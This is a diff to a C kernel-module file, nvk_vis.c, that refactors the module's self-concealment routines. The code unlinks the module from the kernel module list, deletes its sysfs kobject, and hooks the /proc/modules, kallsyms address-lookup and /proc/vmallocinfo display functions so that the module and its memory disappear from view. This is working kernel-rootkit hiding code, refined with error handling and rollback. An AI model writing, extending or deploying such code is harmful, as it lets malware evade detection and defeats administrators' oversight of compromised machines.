@@ -2,6 +2,8 @@
 /* nvk_vis.c — Module visibility management (list, sysfs, proc, kallsyms, vmalloc). */
 #include <nvk.h>
 #include "nvk_internal.h"
+#include "nvk_vis_list.h"
+#include "nvk_vis_vmalloc.h"
 
 static __always_inline int _neverc_krt_str_starts_with(const char *str,
 						       const char *prefix)
@@ -53,33 +55,54 @@ static int _neverc_krt_maps_region_count;
 static neverc_krt_mutex_lock_fn   _neverc_krt_vis_mutex_lock;
 static neverc_krt_mutex_unlock_fn _neverc_krt_vis_mutex_unlock;
 static void                      *_neverc_krt_module_mutex;
+static struct list_head          *_neverc_krt_modules;
 static neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
 static int                        _neverc_krt_vis_inited;
 
 static neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
 static const char                *_neverc_krt_vis_target_name;
+static struct neverc_krt_vis_state *_neverc_krt_proc_state;
 
 static neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
 static unsigned long              _neverc_krt_vis_mod_start;
 static unsigned long              _neverc_krt_vis_mod_end;
+static struct neverc_krt_vis_state *_neverc_krt_ks_state;
 
 static neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
-static unsigned long              _neverc_krt_vmalloc_vis_start;
-static unsigned long              _neverc_krt_vmalloc_vis_end;
+static struct neverc_krt_vmalloc_range
+	_neverc_krt_vmalloc_ranges[NEVERC_KRT_VMALLOC_RANGE_MAX];
+static int _neverc_krt_vmalloc_range_count;
 
 /* ==================================================================== */
 /*  Init / module list visibility filter apply/restore              */
 /* ==================================================================== */
 
+static void _neverc_krt_vis_lock(void)
+{
+	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
+		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);
+}
+
+static void _neverc_krt_vis_unlock(void)
+{
+	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
+		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
+}
+
 int neverc_krt_vis_init(void)
 {
 	if (_neverc_krt_vis_inited) return 0;
+
+	(void)neverc_krt_mem_init();
+	(void)neverc_krt_compat_init();
 
 	_neverc_krt_vis_mutex_lock =
 		(neverc_krt_mutex_lock_fn)NEVERC_KRT_LOOKUP("mutex_lock");
 	_neverc_krt_vis_mutex_unlock =
 		(neverc_krt_mutex_unlock_fn)NEVERC_KRT_LOOKUP("mutex_unlock");
 	_neverc_krt_module_mutex = (void *)NEVERC_KRT_LOOKUP("module_mutex");
+	_neverc_krt_modules =
+		(struct list_head *)NEVERC_KRT_LOOKUP("modules");
 	_neverc_krt_kobject_del =
 		(neverc_krt_kobject_del_fn)NEVERC_KRT_LOOKUP("kobject_del");
 
@@ -87,120 +110,109 @@ int neverc_krt_vis_init(void)
 	return 0;
 }
 
-void neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
-			 struct neverc_krt_this_module *mod)
+int neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
+			  struct neverc_krt_this_module *mod)
 {
 	struct list_head *our;
-	unsigned long n_raw, p_raw;
+	struct list_head *saved_next;
+	struct list_head *saved_prev;
+	int ret;
 
-	if (!state || !mod || state->filtered) return;
+	if (!_neverc_krt_vis_inited)
+		return -EAGAIN;
+	if (!state || !mod)
+		return -EINVAL;
+	if (state->filtered)
+		return 0;
 
 	our = _neverc_krt_get_mod_list(mod);
 	if (!our)
-		return;
-	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
-	    neverc_krt_mem_read(&p_raw, &our->prev, 8))
-		return;
+		return -EOPNOTSUPP;
 
-	struct list_head *n = (struct list_head *)n_raw;
-	struct list_head *p = (struct list_head *)p_raw;
-
-	if ((unsigned long)n < 0xFFFF000000000000UL ||
-	    (unsigned long)p < 0xFFFF000000000000UL)
-		return;
-
-	state->saved_next = n;
-	state->saved_prev = p;
-
-	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
-		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);
-
-	neverc_krt_mem_write(&p->next, &n, 8);
-	neverc_krt_mem_write(&n->prev, &p, 8);
-	our->next = our;
-	our->prev = our;
-
-	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
-		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
-
+	_neverc_krt_vis_lock();
+	ret = _neverc_krt_vis_list_unlink(
+		our, &saved_prev, &saved_next);
+	_neverc_krt_vis_unlock();
+	if (ret)
+		return ret;
+	state->saved_next = saved_next;
+	state->saved_prev = saved_prev;
 	state->filtered = 1;
+	return 0;
 }
 
-void neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
-			 struct neverc_krt_this_module *mod)
+int neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
+			   struct neverc_krt_this_module *mod)
 {
 	struct list_head *our;
+	int ret;
 
-	if (!state || !mod || !state->filtered) return;
+	if (!state || !mod)
+		return -EINVAL;
+	if (!state->filtered)
+		return 0;
+	if (!_neverc_krt_vis_inited)
+		return -EAGAIN;
 
 	our = _neverc_krt_get_mod_list(mod);
 	if (!our)
-		return;
+		return -EOPNOTSUPP;
 
-	if (!state->saved_next || !state->saved_prev)
-		return;
-	if ((unsigned long)state->saved_next < 0xFFFF000000000000UL ||
-	    (unsigned long)state->saved_prev < 0xFFFF000000000000UL)
-		return;
-
-	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
-		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);
-
-	struct list_head prev_copy, next_copy;
-	if (neverc_krt_mem_read(&prev_copy, state->saved_prev, 16) ||
-	    neverc_krt_mem_read(&next_copy, state->saved_next, 16)) {
-		if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
-			_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
-		return;
-	}
-
-	if (prev_copy.next == state->saved_next &&
-	    next_copy.prev == state->saved_prev) {
-		our->next = state->saved_next;
-		our->prev = state->saved_prev;
-		neverc_krt_mem_write(&state->saved_prev->next, &our, 8);
-		neverc_krt_mem_write(&state->saved_next->prev, &our, 8);
-	}
-
-	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
-		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
-
+	_neverc_krt_vis_lock();
+	if (state->saved_prev && state->saved_next)
+		ret = _neverc_krt_vis_list_restore_neighbors(
+			our, state->saved_prev, state->saved_next);
+	else if (_neverc_krt_modules)
+		ret = _neverc_krt_vis_list_restore(_neverc_krt_modules, our);
+	else
+		ret = -EAGAIN;
+	_neverc_krt_vis_unlock();
+	if (ret)
+		return ret;
 	state->filtered = 0;
+	state->saved_next = (struct list_head *)0;
+	state->saved_prev = (struct list_head *)0;
+	return 0;
 }
 
 int neverc_krt_vis_is_filtered(const struct neverc_krt_vis_state *state)
 {
-	return state->filtered;
+	return state ? state->filtered : 0;
 }
 
 /* ==================================================================== */
 /*  Sysfs removal                                                       */
 /* ==================================================================== */
 
-void neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
-				 struct neverc_krt_this_module *mod)
+int neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
+				struct neverc_krt_this_module *mod)
 {
 	const struct neverc_krt_gki_layout *layout;
 	unsigned long name;
 	void *kobj;
 
-	if (!state || !mod || state->sysfs_removed || !_neverc_krt_kobject_del)
-		return;
+	if (!state || !mod)
+		return -EINVAL;
+	if (state->sysfs_removed)
+		return 0;
+	if (!_neverc_krt_kobject_del)
+		return -EOPNOTSUPP;
 
 	layout = _neverc_krt_get_proven_gki_layout(NEVERC_KRT_LAYOUT_CERT_FULL);
 	if (!layout)
-		return;
+		return -EOPNOTSUPP;
 	kobj = (unsigned char *)mod + layout->module_kobj;
 	if (neverc_krt_mem_read(
 		    &name, (unsigned char *)kobj + layout->kobject_name,
 		    sizeof(name)) ||
 	    name < 0xFFFF000000000000UL ||
 	    name >= 0xFFFFFFFFFFFFF000UL)
-		return;
+		return -EFAULT;
 
 	_neverc_krt_kobject_del(kobj);
 	state->saved_kobj = kobj;
 	state->sysfs_removed = 1;
+	return 0;
 }
 
 /* ==================================================================== */
@@ -242,12 +254,14 @@ int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
 {
 	void *target;
 
+	if (!state || !module_name)
+		return -EINVAL;
 	if (state->seq_show_interposed) return 0;
+	if (_neverc_krt_proc_state)
+		return -EBUSY;
 
-	target = NEVERC_KRT_LOOKUP("modules_seq_show");
-	if (!target)
-		target = NEVERC_KRT_LOOKUP("m_show");
-	if (!target) return -1;
+	target = _neverc_krt_resolve_modules_show();
+	if (!target) return -EOPNOTSUPP;
 
 	state->module_name = module_name;
 	_neverc_krt_vis_target_name = module_name;
@@ -255,9 +269,14 @@ int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
 	int ret = neverc_krt_interpose_install(&state->seq_show_interpose, target,
 				   (void *)_neverc_krt_mod_seq_show_filter,
 				   (void **)&_neverc_krt_orig_mod_seq_show);
-	if (ret) return ret;
+	if (ret) {
+		_neverc_krt_vis_target_name = (const char *)0;
+		state->module_name = (const char *)0;
+		return ret;
+	}
 
 	state->seq_show_interposed = 1;
+	_neverc_krt_proc_state = state;
 	return 0;
 }
 
@@ -279,14 +298,16 @@ int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 {
 	void *target;
 
+	if (!state || !module_name)
+		return -EINVAL;
 	if (state->kallsyms_filtered) return 0;
-
-	_neverc_krt_vis_target_name = module_name;
+	if (_neverc_krt_ks_interposed)
+		return -EBUSY;
 
 	target = NEVERC_KRT_LOOKUP("is_module_text_address");
 	if (!target)
 		target = NEVERC_KRT_LOOKUP("__module_text_address");
-	if (!target) return -1;
+	if (!target) return -EOPNOTSUPP;
 
 	unsigned char *mod_base = (unsigned char *)&__this_module;
 	_neverc_krt_vis_mod_start = (unsigned long)mod_base;
@@ -298,6 +319,7 @@ int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 	if (ret) return ret;
 
 	_neverc_krt_ks_interposed = 1;
+	_neverc_krt_ks_state = state;
 	state->kallsyms_filtered = 1;
 	return 0;
 }
@@ -306,14 +328,94 @@ int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 /*  Composite full visibility filter + cleanup                          */
 /* ==================================================================== */
 
-void neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
-			      struct neverc_krt_this_module *mod,
-			      const char *module_name)
+static int _neverc_krt_vis_proc_remove(
+	struct neverc_krt_vis_state *state)
 {
-	neverc_krt_vis_filter(state, mod);
-	neverc_krt_vis_sysfs_remove(state, mod);
-	neverc_krt_vis_proc_filter(state, module_name);
-	neverc_krt_vis_kallsyms_filter(state, module_name);
+	int ret;
+
+	if (!state || !state->seq_show_interposed)
+		return 0;
+	ret = neverc_krt_interpose_remove(&state->seq_show_interpose);
+	if (ret)
+		return ret;
+	state->seq_show_interposed = 0;
+	state->module_name = (const char *)0;
+	_neverc_krt_orig_mod_seq_show =
+		(neverc_krt_mod_seq_show_fn)0;
+	_neverc_krt_vis_target_name = (const char *)0;
+	if (_neverc_krt_proc_state == state)
+		_neverc_krt_proc_state =
+			(struct neverc_krt_vis_state *)0;
+	return 0;
+}
+
+static int _neverc_krt_vis_ks_remove(
+	struct neverc_krt_vis_state *state)
+{
+	int ret;
+
+	if (!state || !state->kallsyms_filtered)
+		return 0;
+	ret = neverc_krt_interpose_remove(&_neverc_krt_ks_interpose);
+	if (ret)
+		return ret;
+	state->kallsyms_filtered = 0;
+	_neverc_krt_ks_interposed = 0;
+	_neverc_krt_orig_mod_text_addr =
+		(neverc_krt_mod_addr_fn)0;
+	if (_neverc_krt_ks_state == state)
+		_neverc_krt_ks_state =
+			(struct neverc_krt_vis_state *)0;
+	return 0;
+}
+
+int neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
+			       struct neverc_krt_this_module *mod,
+			       const char *module_name)
+{
+	int installed_proc;
+	int installed_ks;
+	int filtered;
+	int ret;
+	int rollback;
+
+	if (!state || !mod || !module_name)
+		return -EINVAL;
+	installed_proc = !state->seq_show_interposed;
+	installed_ks = !state->kallsyms_filtered;
+	filtered = !state->filtered;
+
+	ret = neverc_krt_vis_proc_filter(state, module_name);
+	if (ret)
+		return ret;
+	ret = neverc_krt_vis_kallsyms_filter(state, module_name);
+	if (ret)
+		goto rollback_proc;
+	ret = neverc_krt_vis_filter(state, mod);
+	if (ret)
+		goto rollback_ks;
+	ret = neverc_krt_vis_sysfs_remove(state, mod);
+	if (!ret)
+		return 0;
+
+	if (filtered) {
+		rollback = neverc_krt_vis_restore(state, mod);
+		if (rollback)
+			return rollback;
+	}
+rollback_ks:
+	if (installed_ks) {
+		rollback = _neverc_krt_vis_ks_remove(state);
+		if (rollback)
+			return rollback;
+	}
+rollback_proc:
+	if (installed_proc) {
+		rollback = _neverc_krt_vis_proc_remove(state);
+		if (rollback)
+			return rollback;
+	}
+	return ret;
 }
 
 /* ==================================================================== */
@@ -381,17 +483,26 @@ static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
 {
 	if (!_neverc_krt_orig_vmalloc_show) return 0;
 
-	if (v && _neverc_krt_vmalloc_vis_start) {
+	if (v && _neverc_krt_vmalloc_range_count > 0) {
 		const struct neverc_krt_gki_layout *layout =
 			_neverc_krt_get_proven_gki_layout(
 				NEVERC_KRT_LAYOUT_CERT_FULL);
 		unsigned long start = 0;
+		unsigned long end = 0;
+		int i;
+
 		if (layout && !neverc_krt_mem_read(
 			    &start, (const char *)v + layout->vmap_va_start,
-			    sizeof(start)) && start) {
-			if (start >= _neverc_krt_vmalloc_vis_start &&
-			    start < _neverc_krt_vmalloc_vis_end)
-				return 0;
+			    sizeof(start)) &&
+		    !neverc_krt_mem_read(
+			    &end, (const char *)v + layout->vmap_va_end,
+			    sizeof(end))) {
+			for (i = 0; i < _neverc_krt_vmalloc_range_count; i++) {
+				if (_neverc_krt_vmalloc_range_overlaps(
+					    &_neverc_krt_vmalloc_ranges[i],
+					    start, end))
+					return 0;
+			}
 		}
 	}
 
@@ -400,33 +511,50 @@ static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
 
 static void *_neverc_krt_resolve_vmalloc_s_show(void)
 {
-	void *fn = (void *)NEVERC_KRT_LOOKUP("vmalloc_info_show");
-	if (fn) return fn;
-	fn = (void *)NEVERC_KRT_LOOKUP("s_show.23");
-	if (fn) return fn;
-	fn = (void *)NEVERC_KRT_LOOKUP("s_show.24");
-	if (fn) return fn;
-	fn = (void *)NEVERC_KRT_LOOKUP("s_show.25");
-	return fn;
+	const struct neverc_krt_runtime_caps *caps = _neverc_krt_current_caps();
+
+	if (!caps)
+		return NULL;
+	return _neverc_krt_resolve_vmalloc_show_backend(
+		caps->vmalloc_visibility_backend);
 }
 
 int neverc_krt_vis_vmalloc_filter(void)
 {
+	const struct neverc_krt_profile *profile;
+	int profile_id;
 	void *target;
+	int range_count;
 
 	if (_neverc_krt_vmalloc_interposed) return 0;
 
-	_neverc_krt_vmalloc_vis_start = (unsigned long)&__this_module;
-	_neverc_krt_vmalloc_vis_end = _neverc_krt_vmalloc_vis_start +
-				_neverc_krt_get_module_size() + 0x10000;
+	profile_id = _neverc_krt_current_profile_id();
+	profile = profile_id < 0 ? NULL :
+		neverc_krt_find_profile((unsigned int)profile_id);
+	if (!profile)
+		return -1;
+	range_count = _neverc_krt_collect_module_vmalloc_ranges(
+		&__this_module, profile->module_memory_offset,
+		profile->module_memory_count, profile->module_memory_stride,
+		profile->module_memory_base, profile->module_memory_size,
+		_neverc_krt_vmalloc_ranges, NEVERC_KRT_VMALLOC_RANGE_MAX);
+	if (range_count < 0)
+		return -1;
+	_neverc_krt_vmalloc_range_count = range_count;
 
 	target = _neverc_krt_resolve_vmalloc_s_show();
-	if (!target) return -1;
+	if (!target) {
+		_neverc_krt_vmalloc_range_count = 0;
+		return -1;
+	}
 
 	int ret = neverc_krt_interpose_install(&_neverc_krt_vmalloc_interpose, target,
 				   (void *)_neverc_krt_vmalloc_show_filter,
 				   (void **)&_neverc_krt_orig_vmalloc_show);
-	if (ret) return ret;
+	if (ret) {
+		_neverc_krt_vmalloc_range_count = 0;
+		return ret;
+	}
 
 	_neverc_krt_vmalloc_interposed = 1;
 	return 0;
@@ -441,6 +569,13 @@ int neverc_krt_vis_pause_interposes(void)
 	int ret = 0;
 	int next;
 
+	if (_neverc_krt_proc_state &&
+	    _neverc_krt_proc_state->seq_show_interposed) {
+		next = neverc_krt_interpose_pause(
+			&_neverc_krt_proc_state->seq_show_interpose);
+		if (next && !ret)
+			ret = next;
+	}
 	if (_neverc_krt_vmalloc_interposed) {
 		next = neverc_krt_interpose_pause(&_neverc_krt_vmalloc_interpose);
 		if (next && !ret)
@@ -454,12 +589,33 @@ int neverc_krt_vis_pause_interposes(void)
 	return ret;
 }
 
-void neverc_krt_vis_remove_interposes(void)
+int neverc_krt_vis_remove_interposes(void)
 {
-	if (_neverc_krt_ks_interposed &&
-	    neverc_krt_interpose_remove(&_neverc_krt_ks_interpose) == 0)
-		_neverc_krt_ks_interposed = 0;
-	if (_neverc_krt_vmalloc_interposed &&
-	    neverc_krt_interpose_remove(&_neverc_krt_vmalloc_interpose) == 0)
-		_neverc_krt_vmalloc_interposed = 0;
+	int ret = 0;
+	int next;
+
+	if (_neverc_krt_proc_state) {
+		next = _neverc_krt_vis_proc_remove(
+			_neverc_krt_proc_state);
+		if (next && !ret)
+			ret = next;
+	}
+	if (_neverc_krt_ks_state) {
+		next = _neverc_krt_vis_ks_remove(_neverc_krt_ks_state);
+		if (next && !ret)
+			ret = next;
+	}
+	if (_neverc_krt_vmalloc_interposed) {
+		next = neverc_krt_interpose_remove(
+			&_neverc_krt_vmalloc_interpose);
+		if (next && !ret) {
+			ret = next;
+		} else if (!next) {
+			_neverc_krt_vmalloc_interposed = 0;
+			_neverc_krt_vmalloc_range_count = 0;
+			_neverc_krt_orig_vmalloc_show =
+				(neverc_krt_vmalloc_show_fn)0;
+		}
+	}
+	return ret;
 }
